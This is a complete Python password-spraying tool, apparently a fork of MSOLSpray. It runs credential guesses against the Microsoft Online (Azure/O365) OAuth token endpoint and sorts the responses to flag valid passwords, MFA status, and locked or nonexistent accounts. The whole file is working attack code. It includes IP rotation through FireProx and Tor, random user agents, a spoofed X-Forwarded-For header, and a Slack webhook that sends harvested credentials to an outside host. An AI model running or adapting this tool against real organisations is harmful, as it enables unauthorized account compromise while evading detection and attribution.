#!/usr/bin/env python3
import requests
import argparse
import time
import urllib3
from math import trunc
from random import randrange, shuffle
from fake_useragent import UserAgent
from stem import Signal
from stem.control import Controller

description = """
This script will perform password spraying against Microsoft Online accounts (Azure/O365). The script logs if a user cred is valid, if MFA is enabled on the account, if a tenant doesn't exist, if a user doesn't exist, if the account is locked, or if the account is disabled.
"""

epilog = """
EXAMPLE USAGE:
This command will use the provided userlist and attempt to authenticate to each account with a password of Winter2020.
    python3 msolspray-ng.py --userlist ./userlist.txt --password Winter2020

This command uses the specified FireProx URL to spray from randomized IP addresses and writes the output to a file. See this for FireProx setup: https://github.com/ustayready/fireprox.
    python3 msolspray-ng.py --userlist ./userlist.txt --password P@ssword --url https://api-gateway-endpoint-id.execute-api.us-east-1.amazonaws.com/fireprox --out valid-users.txt

This command will create a new tor circuit every 5 login attempts and use it to spray from randomized IP addresses.
    python3 msolspray-ng.py --userlist ./userlist.txt --password P@ssword --tor --tor-control-pw H1d3M3 --tor-refresh-interval 5

TIPS:
[1] When using along with FireProx, pass option -H "X-My-X-Forwarded-For: 127.0.0.1" to spoof origin IP.
"""


class text_colors:
    """Helper class to make colorizing easy."""

    red = "\033[91m"
    green = "\033[92m"
    yellow = "\033[93m"
    reset = "\033[0m"


class SlackWebhook:
    """Helper class for sending posts to Slack using webhooks."""

    def __init__(self, webhook_url):
        self.webhook_url = webhook_url

    # Post a simple update to slack
    def post(self, text):
        block = f"```\n{text}\n```"
        payload = {
            "blocks": [{"type": "section", "text": {"type": "mrkdwn", "text": block}}]
        }
        status = self.__post_payload(payload)
        return status

    # Post a json payload to slack webhook URL
    def __post_payload(self, payload):
        response = requests.post(self.webhook_url, json=payload, timeout=4)
        if response.status_code != 200:
            print(
                "%s[Error] %s%s"
                % (
                    text_colors.red,
                    "Could not send notification to Slack",
                    text_colors.reset,
                )
            )


def notify(webhook, text):
    """Send notifications using Webhooks.

    Args:
        webhook (str): Webhook endpoint
        text (str): Text to be sent
    """
    notifier = SlackWebhook(webhook)
    try:
        notifier.post(text)
    except BaseException:
        pass


def get_list_from_file(file_):
    """Create a list from the contents of a file.

    Args:
        file_ (str): Input file name

    Returns:
        List[str]: Content of input file splitted by lines
    """
    with open(file_, "r") as f:
        list_ = [line.strip() for line in f]
    return list_


def assertions(args):
    """Make assertions about the provided args.

    Args:
        args (optparse_parser.Values): parsed args as returned by argparse.parse_args
    """
    assert args.sleep >= 0
    assert args.pause >= 0
    assert args.jitter in range(101)
    assert args.max_lockout >= 0
    assert args.timeout >= 0
    assert args.creds or ((args.username or args.usernames) and (args.password or args.passwords))
    if args.proxy:
        assert "://" in args.proxy, "Malformed proxy. Missing schema?"


def get_exit_node_details(control_port, control_pw):
    """Get the exit node details.
    Args:
        control_port (int): Port for the tor control port
        control_pw (str): Password for the tor control port
    Returns:
        dict: Dictionary containing nickname, IP address and fingerprint of the exit node
    """
    with Controller.from_port(port=control_port) as controller:
        controller.authenticate(
            password=control_pw
        )

        for circ in controller.get_circuits():
            if circ.status != "BUILT":
                continue

            exit_fingerprint = circ.path[-1][0]
            desc = controller.get_network_status(exit_fingerprint)
            if desc:
                return {
                    "nickname": desc.nickname,
                    "ip": desc.address,
                    "fingerprint": desc.fingerprint,
                }
        return None


def need_refresh_tor(tor, refresh_interval, count):
    """Check if we need to refresh the tor circuit.

    Args:
        tor (bool): If tor is enabled
        refresh_interval (int): Number of login attempts to wait before refreshing the circuit
        count (int): Current number of login attempts

    Returns:
        bool: True if we need to refresh the circuit
    """
    return tor and count % refresh_interval == 0


def refresh_tor_circuit(control_port, control_pw, verbose=False):
    """Refresh the tor circuit.

    Args:
        control_port (int): Port for the tor control port
        control_pw (str): Password for the tor control port
    """
    with Controller.from_port(port=control_port) as controller:
        controller.authenticate(control_pw)
        controller.signal(Signal.NEWNYM)
        controller.close()
        time.sleep(5)  # wait for the new circuit to be established
        if verbose:
            exit_node = get_exit_node_details(control_port, control_pw)
            if exit_node:
                print(
                    f"{text_colors.green}New Tor circuit established. Exit node: {exit_node['nickname']} ({exit_node['ip']}) - {exit_node['fingerprint']}{text_colors.reset}"
                )
            else:
                print(
                    f"{text_colors.red}Failed to get exit node details after refreshing Tor circuit.{text_colors.reset}"
                )


# disable ssl warnings
urllib3.disable_warnings()

parser = argparse.ArgumentParser(
    description=description,
    epilog=epilog,
    formatter_class=argparse.RawDescriptionHelpFormatter,
)

group_user = parser.add_mutually_exclusive_group(required=True)
group_user.add_argument("-u", "--username", type=str, help="Single username")
group_user.add_argument(
    "-U",
    "--usernames",
    type=str,
    metavar="FILE",
    help="File containing usernames in the format 'user@domain'.",
)
group_user.add_argument(
    "-C",
    "--creds",
    type=str,
    metavar="FILE",
    help="File containing credentials in the format '<user><separator><password>'.",
)
group_password = parser.add_mutually_exclusive_group(required=False)
group_password.add_argument("-p", "--password", type=str, help="Single password.")
group_password.add_argument(
    "-P",
    "--passwords",
    type=str,
    help="File containing passwords, one per line.",
    metavar="FILE",
)
parser.add_argument(
    "--sep",
    default=",",
    help="Separator used when parsing credentials file in CSV format."
)
parser.add_argument(
    "-o",
    "--out",
    metavar="OUTFILE",
    default="valid_creds.txt",
    help="A file to output valid results to (default: %(default)s).",
)
parser.add_argument(
    "-x",
    "--proxy",
    type=str,
    help="Use proxy on requests (e.g. http://127.0.0.1:8080)",
)
parser.add_argument(
    "--url",
    default="https://login.microsoft.com",
    help=(
        "A comma-separated list of URL(s) to spray against (default: %(default)s)."
        " Potentially useful if pointing at an API Gateway URL generated with something like FireProx to randomize the IP address you are authenticating from."
    ),
)
group_force = parser.add_mutually_exclusive_group(required=False)
group_force.add_argument(
    "-f",
    "--force",
    action="store_true",
    help="Forces the spray to continue and not stop when multiple account lockouts are detected.",
)
group_force.add_argument(
    "--force-first",
    action="store_true",
    dest="force_first",
    help="Like --force but only for first iteration. Use it with '-a 2' for optimization.",
)
parser.add_argument(
    "--shuffle",
    action="store_true",
    help="Shuffle user list.",
)
parser.add_argument(
    "-a",
    "--auto-remove",
    dest="auto_remove",
    default=0,
    type=int,
    choices=[0, 1, 2],
    help="Auto remove accounts from next iterations (0: valid credentials (default), 1: previous + nonexistent/disabled, 2: previous + locked).",
)
parser.add_argument(
    "--notify",
    type=str,
    help="Slack webhook for sending notifications about results (default: %(default)s).",
    default=None,
    required=False,
)
parser.add_argument(
    "--notify-actions",
    type=str,
    dest="notify_actions",
    help="Slack webhook for sending notifications about needed actions (default: same as --notify).",
    default=None,
    required=False,
)
parser.add_argument(
    "--notify-each",
    action="store_true",
    dest="notify_each",
    help="If set in conjunction with --notify WEBHOOK, it will notify each valid creds besides final summary.",
)
parser.add_argument(
    "-s",
    "--sleep",
    default=0,
    type=int,
    help="Sleep this many seconds between tries (default: %(default)s).",
)
parser.add_argument(
    "--pause",
    default=15,
    type=float,
    help="Pause (in minutes) between each iteration (default: %(default)s).",
)
parser.add_argument(
    "-j",
    "--jitter",
    type=int,
    default=0,
    help="Maximum of additional delay given in percentage over base delay (default: %(default)s).",
)
parser.add_argument(
    "-l",
    "--max-lockout",
    default=10,
    metavar="PERCENT",
    type=int,
    dest="max_lockout",
    help="Maximum lockouts (in percent) to be observed before ask to abort execution. (default: %(default)s).",
)
parser.add_argument(
    "-H",
    "--header",
    help="Extra header to include in the request (can be used multiple times).",
    action="append",
    dest="headers",
)
parser.add_argument(
    "-A",
    "--user-agent",
    default="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
    dest="user_agent",
    metavar="NAME",
    help='Send User-Agent %(metavar)s to server (default: "%(default)s").',
)
parser.add_argument(
    "--rua", action="store_true", help="Send random User-Agent in each request."
)
parser.add_argument(
    "--timeout",
    default=4,
    type=float,
    help="Timeout for requests (default: %(default)s)",
)
parser.add_argument(
    "--tor",
    action="store_true",
    help="Use tor for requests (overrides --proxy).",
)
parser.add_argument(
    "--tor-port",
    dest="socks_port",
    default=9050,
    type=int,
    help="Tor socks port to use (default: %(default)s).",
)
parser.add_argument(
    "--tor-control-port",
    dest="control_port",
    default=9051,
    type=int,
    help="Tor control port to use (default: %(default)s).",
)
parser.add_argument(
    "--tor-control-pw",
    dest="control_pw",
    default=None,
    type=str,
    help="Password for Tor control port (default: %(default)s).",
)
parser.add_argument(
    "--tor-refresh-interval",
    dest="refresh_interval",
    default=10,
    type=int,
    help="Interval (in number of login attempts) to refresh Tor circuit (default: %(default)s).",
)
parser.add_argument(
    "-v",
    "--verbose",
    action="store_true",
    help="Prints usernames that could exist in case of invalid password.",
)

args = parser.parse_args()
assertions(args)

args.pause = args.pause * 60
args.jitter += 1
if args.notify and args.notify_actions is None:
    args.notify_actions = args.notify

if args.creds:
    credentials = get_list_from_file(args.creds)
else:
    usernames = [args.username] if args.username else get_list_from_file(args.usernames)
    passwords = [args.password] if args.password else get_list_from_file(args.passwords)

args.url = args.url.split(",")
proxies = None
if args.proxy:
    proxies = {
        "http": args.proxy,
        "https": args.proxy,
    }
if args.tor:
    proxies = {
        "http": f"socks5://127.0.0.1:{args.socks_port}",
        "https": f"socks5://127.0.0.1:{args.socks_port}",
    }
interrupt = False
url_idx = 0
start_time = time.strftime("%Y%m%d%H%M%S")

# TODO: refactor code to remove duplication
if args.creds:
    # reset variables
    results = ""
    results_list = []
    creds_counter = 0
    creds_count = len(credentials)
    lockout_question = False
    lockout_max = trunc((args.max_lockout / 100) * creds_count)
    lockout_counter = 0

    print(f"There are {creds_count} credentials in total to try,")
    print("Now spraying Microsoft Online.")
    print(f"Current date and time: {time.ctime()}")

    if args.shuffle:
        shuffle(credentials)

    for cindex, cred in enumerate(credentials):
        if interrupt:
            break

        if creds_counter > 0 and args.sleep > 0:
            time.sleep(args.sleep + args.sleep * (randrange(args.jitter) / 100))

        creds_counter += 1
        print(f"{creds_counter} of {creds_count} credentials tested", end="\r")

        username, password = cred.split(args.sep, 1)

        body = {
            "resource": "https://graph.windows.net",
            # (see https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/how-to-retrieve-an-azure-ad-bulk-token-with-powershell/ba-p/2944894)
            "client_id": "1b730954-1685-4b74-9bfd-dac224a7b894",  # MS Graph API client id
            "client_info": "1",
            "grant_type": "password",
            "username": username,
            "password": password,
            "scope": "openid",
        }

        headers = {
            "Accept": "application/json",
            "Content-Type": "application/x-www-form-urlencoded",
        }
        # include custom headers
        if args.headers:
            for header in args.headers:
                h, v = header.split(":", 1)
                headers[h.strip()] = v.strip()
        # set user-agent
        if args.rua:
            ua = UserAgent(fallback=args.user_agent)  # avoid exception with fallback
            headers["User-Agent"] = ua.random
        else:
            headers["User-Agent"] = args.user_agent

        # rotate over URLs
        url = args.url[url_idx % len(args.url)]
        url_idx += 1

        issued = False
        retry = 3
        while not issued and retry > 0:
            try:
                r = requests.post(
                    f"{url}/common/oauth2/token",
                    headers=headers,
                    data=body,
                    proxies=proxies,
                    verify=False,
                    timeout=args.timeout,
                )
            except Exception as e:
                retry -= 1
                if retry == 0:
                    print(f"{text_colors.red}Error: {e}{text_colors.reset}")
            else:
                issued = True
        if not issued:
            with open(start_time + "_untested.txt", "a") as untested_file:
                untested_file.write(f"{username}:{password}\n")
            continue

        if r.status_code == 200:
            print(
                f"{text_colors.green}SUCCESS! {username} : {password}{text_colors.reset}"
            )
            results += f"{username} : {password}\n"
            results_list.append(f"{username}:{password}")

            credentials.remove(cred)
            # remove other credentials with same username but different password
            for curr in credentials:
                if curr.startswith(username + args.sep):
                    credentials.remove(curr)

            if args.notify and args.notify_each:
                msg = "Found valid credentials! (-.^)\n\n"
                msg += f"{username}:{password}"
                notify(args.notify, msg)
        else:
            resp = r.json()
            error = resp["error_description"]

            if "AADSTS50126" in error:
                if args.verbose:
                    print(
                        f"VERBOSE: Invalid username or password. Username: {username} could exist."
                    )
                continue

            elif "AADSTS50128" in error or "AADSTS50059" in error:
                print(
                    f"{text_colors.yellow}WARNING! Tenant for account {username} doesn't exist. Check the domain to make sure they are using Azure/O365 services.{text_colors.reset}"
                )

            elif "AADSTS50034" in error:
                print(
                    f"{text_colors.yellow}WARNING! The user {username} doesn't exist.{text_colors.reset}"
                )
                if args.auto_remove > 0:
                    credentials.remove(cred)
                    # remove other credentials with same username but different password
                    for curr in credentials:
                        if curr.startswith(username + args.sep):
                            credentials.remove(curr)

            elif "AADSTS50079" in error or "AADSTS50076" in error:
                # Microsoft MFA response
                print(
                    f"{text_colors.green}SUCCESS! {username} : {password} - NOTE: The response indicates MFA (Microsoft) is in use.{text_colors.reset}"
                )
                results += f"{username} : {password}\n"
                results_list.append(
                    f"{username}:{password} - NOTE: The response indicates MFA (Microsoft) is in use"
                )
                credentials.remove(cred)
                # remove other credentials with same username but different password
                for curr in credentials:
                    if curr.startswith(username + args.sep):
                        credentials.remove(curr)
                if args.notify and args.notify_each:
                    msg = "Found valid credentials! (-.^)\n\n"
                    msg += f"{username}:{password} - NOTE: The response indicates MFA (Microsoft) is in use."
                    notify(args.notify, msg)

            elif "AADSTS50158" in error:
                # Conditional Access response (Based off of limited testing this seems to be the response to DUO MFA)
                print(
                    f"{text_colors.green}SUCCESS! {username} : {password} - NOTE: The response indicates conditional access (MFA: DUO or other) is in use.{text_colors.reset}"
                )
                results += f"{username} : {password}\n"
                results_list.append(
                    f"{username}:{password} - NOTE: The response indicates conditional access (MFA: DUO or other) is in use."
                )
                credentials.remove(cred)
                # remove other credentials with same username but different password
                for curr in credentials:
                    if curr.startswith(username + args.sep):
                        credentials.remove(curr)
                if args.notify and args.notify_each:
                    msg = "Found valid credentials! (-.^)\n\n"
                    msg += f"{username}:{password} - NOTE: The response indicates conditional access (MFA: DUO or other) is in use."
                    notify(args.notify, msg)

            elif "AADSTS50053" in error:
                # Locked out account or Smart Lockout in place
                print(
                    f"{text_colors.yellow}WARNING! The account {username} appears to be locked.{text_colors.reset}"
                )
                lockout_counter += 1
                if args.auto_remove > 1:
                    credentials.remove(cred)
                    # remove other credentials with same username but different password
                    for curr in credentials:
                        if curr.startswith(username + args.sep):
                            credentials.remove(curr)

            elif "AADSTS50057" in error:
                # Disabled account
                print(
                    f"{text_colors.yellow}WARNING! The account {username} appears to be disabled.{text_colors.reset}"
                )
                if args.auto_remove > 0:
                    credentials.remove(cred)
                    # remove other credentials with same username but different password
                    for curr in credentials:
                        if curr.startswith(username + args.sep):
                            credentials.remove(curr)

            elif "AADSTS50055" in error:
                # User password is expired
                print(
                    f"{text_colors.green}SUCCESS! {username} : {password} - NOTE: The user's password is expired.{text_colors.reset}"
                )
                results += f"{username} : {password}\n"
                results_list.append(
                    f"{username}:{password} - NOTE: The user's password is expired."
                )
                credentials.remove(cred)
                # remove other credentials with same username but different password
                for curr in credentials:
                    if curr.startswith(username + args.sep):
                        credentials.remove(curr)
                if args.notify and args.notify_each:
                    msg = "Found valid credentials! (-.^)\n\n"
                    msg += (
                        f"{username}:{password} - NOTE: The user's password is expired."
                    )
                    notify(args.notify, msg)

            elif "AADSTS700016" in error:
                # Application not found in directory (probably because random-generated uuid above)
                print(
                    f"{text_colors.green}SUCCESS! {username} : {password}{text_colors.reset}"
                )
                results += f"{username} : {password}\n"
                results_list.append(f"{username}:{password}")
                credentials.remove(cred)
                # remove other credentials with same username but different password
                for curr in credentials:
                    if curr.startswith(username + args.sep):
                        credentials.remove(curr)
                if args.notify and args.notify_each:
                    msg = "Found valid credentials! (-.^)\n\n"
                    msg += f"{username}:{password}"
                    notify(args.notify, msg)
            elif "AADSTS50056" in error:
                # Invalid or null password: password doesn't exist in the directory for this user.
                # The user should be asked to enter their password again.
                print(
                    f"{text_colors.yellow}WARNING! It looks like tenant is using external authentication method (e.g. Okta).{text_colors.reset}"
                )
                continue
            elif "AADSTS53003" in error:
                # Access has been blocked by Conditional Access policies. The
                # access policy does not allow token issuance.
                print(
                    f"{text_colors.green}SUCCESS! {username} : {password} - NOTE: Access blocked by Conditional Access policies.{text_colors.reset}"
                )
                results += f"{username} : {password}\n"
                results_list.append(
                    f"{username}:{password} - NOTE: Access blocked by Conditional Access policies."
                )
                credentials.remove(cred)
                # remove other credentials with same username but different password
                for curr in credentials:
                    if curr.startswith(username + args.sep):
                        credentials.remove(curr)
                if args.notify and args.notify_each:
                    msg = "Found valid credentials! (-.^)\n\n"
                    msg += f"{username}:{password} - NOTE: Access blocked by Conditional Access policies."
                    notify(args.notify, msg)
            else:
                # Unknown errors
                print(f"Got an error we haven't seen yet for credential {cred}")
                print(error)
                # Log unknown errors for late analysis
                with open("unknown_codes.log", "a") as f:
                    f.write(f"Got an error we haven't seen yet for credential {cred}")
                    f.write(f"{error}\n")

            # If the force flag isn't set and lockout count is 10 we'll ask if the user is sure they want to keep spraying
            if (
                not args.force
                and not (args.force_first and cindex == 0)
                and lockout_counter > 0
                and lockout_counter >= lockout_max
                and lockout_question is False
            ):
                print(
                    f"{text_colors.red}WARNING! Multiple Account Lockouts Detected!{text_colors.reset}"
                )
                print(
                    f"{lockout_counter} of the accounts you sprayed appear to be locked out. Do you want to continue this spray?"
                )
                if args.notify_actions:
                    notify(
                        args.notify_actions,
                        "[MSOLSpray-ng] Multiple account lockouts detected! Waiting for user interaction...",
                    )
                yes = {"yes", "y"}
                no = {"no", "n", ""}
                lockout_question = True
                choice = "X"
                while choice not in no and choice not in yes:
                    choice = input("[Y/N] (default is N): ").lower()

                if choice in no:
                    print("Cancelling the password spray.")
                    print(
                        "NOTE: If you are seeing multiple 'account is locked' messages after your first 10 attempts or so this may indicate Azure AD Smart Lockout is enabled."
                    )
                    interrupt = True
                    break

        if need_refresh_tor(args.tor, args.refresh_interval, creds_counter):
            refresh_tor_circuit(args.control_port, args.control_pw, args.verbose)

            # else: continue even though lockout is detected

    if results != "":
        with open(args.out, "a") as out_file:
            out_file.write(results)
        print(f"Results have been written to {args.out}.")
        if args.notify:
            msg = "Found valid credentials! (-.^)\n\n"
            msg += "\n".join(results_list)
            notify(args.notify, msg)
        results = ""
        results_list.clear()

else:
    for pindex, password in enumerate(passwords):
        if interrupt:
            break
        if pindex > 0 and args.pause > 0:
            print(f"[-] Sleeping {args.pause/60} minutes until next iteration")
            time.sleep(args.pause + args.pause * (randrange(args.jitter) / 100))
        # reset variables
        results = ""
        results_list = []
        username_counter = 0
        username_count = len(usernames)
        lockout_question = False
        lockout_max = trunc((args.max_lockout / 100) * username_count)
        lockout_counter = 0

        print(f"There are {username_count} users in total to spray,")
        print("Now spraying Microsoft Online.")
        print(f"Current date and time: {time.ctime()}")
        print(f"[*] Spraying password: {password}")
        if args.shuffle:
            shuffle(usernames)
        for uindex, username in enumerate(usernames):
            if username_counter > 0 and args.sleep > 0:
                time.sleep(args.sleep + args.sleep * (randrange(args.jitter) / 100))

            username_counter += 1
            print(f"{username_counter} of {username_count} users tested", end="\r")

            body = {
                "resource": "https://graph.windows.net",
                # (see https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/how-to-retrieve-an-azure-ad-bulk-token-with-powershell/ba-p/2944894)
                "client_id": "1b730954-1685-4b74-9bfd-dac224a7b894",  # MS Graph API client id
                "client_info": "1",
                "grant_type": "password",
                "username": username,
                "password": password,
                "scope": "openid",
            }

            headers = {
                "Accept": "application/json",
                "Content-Type": "application/x-www-form-urlencoded",
            }
            # include custom headers
            if args.headers:
                for header in args.headers:
                    h, v = header.split(":", 1)
                    headers[h.strip()] = v.strip()
            # set user-agent
            if args.rua:
                ua = UserAgent(fallback=args.user_agent)  # avoid exception with fallback
                headers["User-Agent"] = ua.random
            else:
                headers["User-Agent"] = args.user_agent

            # rotate over URLs
            url = args.url[url_idx % len(args.url)]
            url_idx += 1

            issued = False
            retry = 3
            while not issued and retry > 0:
                try:
                    r = requests.post(
                        f"{url}/common/oauth2/token",
                        headers=headers,
                        data=body,
                        proxies=proxies,
                        verify=False,
                        timeout=args.timeout,
                    )
                except Exception as e:
                    retry -= 1
                    if retry == 0:
                        print(f"{text_colors.red}Error: {e}{text_colors.reset}")
                else:
                    issued = True
            if not issued:
                with open(start_time + "_untested.txt", "a") as untested_file:
                    untested_file.write(f"{username}:{password}\n")
                continue

            if r.status_code == 200:
                print(
                    f"{text_colors.green}SUCCESS! {username} : {password}{text_colors.reset}"
                )
                results += f"{username} : {password}\n"
                results_list.append(f"{username}:{password}")
                usernames.remove(username)
                if args.notify and args.notify_each:
                    msg = "Found valid credentials! (-.^)\n\n"
                    msg += f"{username}:{password}"
                    notify(args.notify, msg)
            else:
                resp = r.json()
                error = resp["error_description"]

                if "AADSTS50126" in error:
                    if args.verbose:
                        print(
                            f"VERBOSE: Invalid username or password. Username: {username} could exist."
                        )
                    continue

                elif "AADSTS50128" in error or "AADSTS50059" in error:
                    print(
                        f"{text_colors.yellow}WARNING! Tenant for account {username} doesn't exist. Check the domain to make sure they are using Azure/O365 services.{text_colors.reset}"
                    )

                elif "AADSTS50034" in error:
                    print(
                        f"{text_colors.yellow}WARNING! The user {username} doesn't exist.{text_colors.reset}"
                    )
                    if args.auto_remove > 0:
                        usernames.remove(username)

                elif "AADSTS50079" in error or "AADSTS50076" in error:
                    # Microsoft MFA response
                    print(
                        f"{text_colors.green}SUCCESS! {username} : {password} - NOTE: The response indicates MFA (Microsoft) is in use.{text_colors.reset}"
                    )
                    results += f"{username} : {password}\n"
                    results_list.append(
                        f"{username}:{password} - NOTE: The response indicates MFA (Microsoft) is in use"
                    )
                    usernames.remove(username)
                    if args.notify and args.notify_each:
                        msg = "Found valid credentials! (-.^)\n\n"
                        msg += f"{username}:{password} - NOTE: The response indicates MFA (Microsoft) is in use."
                        notify(args.notify, msg)

                elif "AADSTS50158" in error:
                    # Conditional Access response (Based off of limited testing this seems to be the response to DUO MFA)
                    print(
                        f"{text_colors.green}SUCCESS! {username} : {password} - NOTE: The response indicates conditional access (MFA: DUO or other) is in use.{text_colors.reset}"
                    )
                    results += f"{username} : {password}\n"
                    results_list.append(
                        f"{username}:{password} - NOTE: The response indicates conditional access (MFA: DUO or other) is in use."
                    )
                    usernames.remove(username)
                    if args.notify and args.notify_each:
                        msg = "Found valid credentials! (-.^)\n\n"
                        msg += f"{username}:{password} - NOTE: The response indicates conditional access (MFA: DUO or other) is in use."
                        notify(args.notify, msg)

                elif "AADSTS50053" in error:
                    # Locked out account or Smart Lockout in place
                    print(
                        f"{text_colors.yellow}WARNING! The account {username} appears to be locked.{text_colors.reset}"
                    )
                    lockout_counter += 1
                    if args.auto_remove > 1:
                        usernames.remove(username)

                elif "AADSTS50057" in error:
                    # Disabled account
                    print(
                        f"{text_colors.yellow}WARNING! The account {username} appears to be disabled.{text_colors.reset}"
                    )
                    if args.auto_remove > 0:
                        usernames.remove(username)

                elif "AADSTS50055" in error:
                    # User password is expired
                    print(
                        f"{text_colors.green}SUCCESS! {username} : {password} - NOTE: The user's password is expired.{text_colors.reset}"
                    )
                    results += f"{username} : {password}\n"
                    results_list.append(
                        f"{username}:{password} - NOTE: The user's password is expired."
                    )
                    usernames.remove(username)
                    if args.notify and args.notify_each:
                        msg = "Found valid credentials! (-.^)\n\n"
                        msg += (
                            f"{username}:{password} - NOTE: The user's password is expired."
                        )
                        notify(args.notify, msg)

                elif "AADSTS700016" in error:
                    # Application not found in directory (probably because random-generated uuid above)
                    print(
                        f"{text_colors.green}SUCCESS! {username} : {password}{text_colors.reset}"
                    )
                    results += f"{username} : {password}\n"
                    results_list.append(f"{username}:{password}")
                    usernames.remove(username)
                    if args.notify and args.notify_each:
                        msg = "Found valid credentials! (-.^)\n\n"
                        msg += f"{username}:{password}"
                        notify(args.notify, msg)
                elif "AADSTS50056" in error:
                    # Invalid or null password: password doesn't exist in the directory for this user.
                    # The user should be asked to enter their password again.
                    print(
                        f"{text_colors.yellow}WARNING! It looks like tenant is using external authentication method (e.g. Okta).{text_colors.reset}"
                    )
                    continue
                elif "AADSTS53003" in error:
                    # Access has been blocked by Conditional Access policies. The
                    # access policy does not allow token issuance.
                    print(
                        f"{text_colors.green}SUCCESS! {username} : {password} - NOTE: Access blocked by Conditional Access policies.{text_colors.reset}"
                    )
                    results += f"{username} : {password}\n"
                    results_list.append(
                        f"{username}:{password} - NOTE: Access blocked by Conditional Access policies."
                    )
                    usernames.remove(username)
                    if args.notify and args.notify_each:
                        msg = "Found valid credentials! (-.^)\n\n"
                        msg += f"{username}:{password} - NOTE: Access blocked by Conditional Access policies."
                        notify(args.notify, msg)
                else:
                    # Unknown errors
                    print(f"Got an error we haven't seen yet for user {username}")
                    print(error)
                    # Log unknown errors for late analysis
                    with open("unknown_codes.log", "a") as f:
                        f.write(f"Got an error we haven't seen yet for user {username}")
                        f.write(f"{error}\n")

            # If the force flag isn't set and lockout count is 10 we'll ask if the user is sure they want to keep spraying
            if (
                not args.force
                and not (args.force_first and pindex == 0)
                and lockout_counter > 0
                and lockout_counter >= lockout_max
                and lockout_question == False
            ):
                print(
                    f"{text_colors.red}WARNING! Multiple Account Lockouts Detected!{text_colors.reset}"
                )
                print(
                    f"{lockout_counter} of the accounts you sprayed appear to be locked out. Do you want to continue this spray?"
                )
                if args.notify_actions:
                    notify(
                        args.notify_actions,
                        "[MSOLSpray-ng] Multiple account lockouts detected! Waiting for user interaction...",
                    )
                yes = {"yes", "y"}
                no = {"no", "n", ""}
                lockout_question = True
                choice = "X"
                while choice not in no and choice not in yes:
                    choice = input("[Y/N] (default is N): ").lower()

                if choice in no:
                    print("Cancelling the password spray.")
                    print(
                        "NOTE: If you are seeing multiple 'account is locked' messages after your first 10 attempts or so this may indicate Azure AD Smart Lockout is enabled."
                    )
                    interrupt = True
                    break
                # else: continue even though lockout is detected

            if need_refresh_tor(args.tor, args.refresh_interval, username_counter):
                refresh_tor_circuit(args.control_port, args.control_pw, args.verbose)

        # end of user iteration
        # write current users to file
        with open(start_time + "_currentusers.txt", "w") as user_file:
            usernames.sort()
            user_file.write("\n".join(usernames))

        if results != "":
            with open(args.out, "a") as out_file:
                out_file.write(results)
            print(f"Results have been written to {args.out}.")
            if args.notify:
                msg = "Found valid credentials! (-.^)\n\n"
                msg += "\n".join(results_list)
                notify(args.notify, msg)
            results = ""
            results_list.clear()
